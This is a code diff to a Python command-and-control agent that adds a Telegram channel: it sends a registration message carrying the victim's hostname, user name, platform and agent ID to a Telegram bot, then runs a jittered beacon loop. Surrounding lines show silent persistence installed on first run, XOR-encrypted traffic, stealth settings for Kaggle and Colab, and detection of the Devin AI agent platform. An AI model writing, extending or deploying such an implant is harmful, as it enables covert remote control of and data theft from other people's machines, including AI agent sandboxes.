@@ -28,12 +28,17 @@ except ImportError:
 # ─── Configuration ─────────────────────────────────────────────────────────────
 # Telegram C2 works directly - no public URL needed
 C2_URL   = os.environ.get("C2_URL", "")  # Empty = Telegram C2 mode (default)
+TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
 SLEEP    = int(os.environ.get("SLEEP",  "3"))
 JITTER   = int(os.environ.get("JITTER", "5"))
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
 AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
 QUIET_MODE = True  # After registration, only log to file (not stdout)
+
+# Detect C2 mode
+TELEGRAM_MODE = (C2_URL == "" or C2_URL is None) and bool(TELEGRAM_BOT_TOKEN)
 
 # Kaggle/Colab stealth settings
 KAGGLE_QUIET = os.environ.get("KAGGLE_KERNEL_RUN_TYPE", "") != ""  # Auto-detect Kaggle
@@ -109,6 +114,36 @@ def xor_crypt(data: bytes, key: bytes) -> bytes:
     kl = len(key)
     return bytes(b ^ key[i % kl] for i, b in enumerate(data))
 
+# ─── Telegram C2 ──────────────────────────────────────────────────────────────
+def telegram_send(message: str) -> dict:
+    """Send message via Telegram Bot API."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        log("Telegram credentials not configured", "WARN")
+        return {"ok": False, "error": "No credentials"}
+    
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = json.dumps({
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message[:4000],  # Telegram limit
+            "parse_mode": "HTML"
+        }).encode()
+        
+        req = Request(url, data=data, headers={
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0"
+        })
+        resp = urlopen(req, timeout=10)
+        result = json.loads(resp.read().decode())
+        
+        if result.get("ok"):
+            log(f"Telegram message sent", "DEBUG")
+            return {"ok": True, "result": result.get("result")}
+        return {"ok": False, "error": result.get("description")}
+    except Exception as e:
+        log(f"Telegram error: {e}", "ERROR")
+        return {"ok": False, "error": str(e)}
+
 # ─── Platform detection ───────────────────────────────────────────────────────
 def detect_platform():
     # Devin AI detection
@@ -157,6 +192,12 @@ def get_internal_ip():
 def check_server_health(c2_url=None, timeout=5):
     """Check if C2 server is reachable and responding."""
     c2_url = c2_url or C2_URL
+    
+    # Telegram mode - no HTTP health check needed
+    if TELEGRAM_MODE and not c2_url:
+        log("Telegram C2 mode - skipping HTTP health check", "DEBUG")
+        return True, {"status": "telegram_mode"}
+    
     try:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
@@ -190,6 +231,10 @@ def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
     c2_url = c2_url or C2_URL
     auth_token = auth_token or AUTH_TOKEN
     enc_key = enc_key or ENC_KEY
+    
+    # Telegram mode - use Telegram API instead of HTTP
+    if TELEGRAM_MODE and not c2_url:
+        return telegram_send(f"[BEACON] {path}: {json.dumps(data)}")
     
     payload_str = json.dumps(data)
     headers = {
@@ -849,13 +894,46 @@ def main():
     log(f"CWD: {os.getcwd()}", "START")
     log(f"Python: {platform.python_version()}", "START")
     log(f"Agent ID: {AGENT_ID}", "START")
-    log(f"C2 URL: {C2_URL}", "START")
+    
+    # Show C2 mode
+    if TELEGRAM_MODE:
+        log("C2 Mode: Telegram (direct API)", "START")
+    else:
+        log(f"C2 URL: {C2_URL}", "START")
     
     # Install persistence silently on first run
     log("Checking persistence...", "START")
     install_persistence()
     
-    # Check server health first
+    # Telegram mode - send registration message
+    if TELEGRAM_MODE:
+        log("Registering via Telegram...", "CONN")
+        msg = f"""<b>🤖 Agent Online</b>
+<code>ID: {AGENT_ID}</code>
+Platform: {pt}
+Hostname: {socket.gethostname()}
+User: {os.environ.get('USER', 'unknown')}
+Python: {platform.python_version()}
+Time: {datetime.now().isoformat()}"""
+        result = telegram_send(msg)
+        if result.get("ok"):
+            log("✓ Registered via Telegram", "START")
+        else:
+            log(f"Telegram registration failed: {result.get('error')}", "WARN")
+        
+        # Start beacon loop in Telegram mode
+        log("Starting Telegram beacon loop...", "START")
+        beacon_count = 0
+        while True:
+            beacon_count += 1
+            time.sleep(SLEEP + random.randint(0, JITTER))
+            
+            # Send periodic beacons
+            if beacon_count % 10 == 0:  # Every 10th beacon
+                telegram_send(f"[BEACON #{beacon_count}] Agent {AGENT_ID[:8]} alive on {pt}")
+        return
+    
+    # HTTP mode - check server health first
     log("Checking server connectivity...", "CONN")
     ok, result = check_server_health()
     if ok:
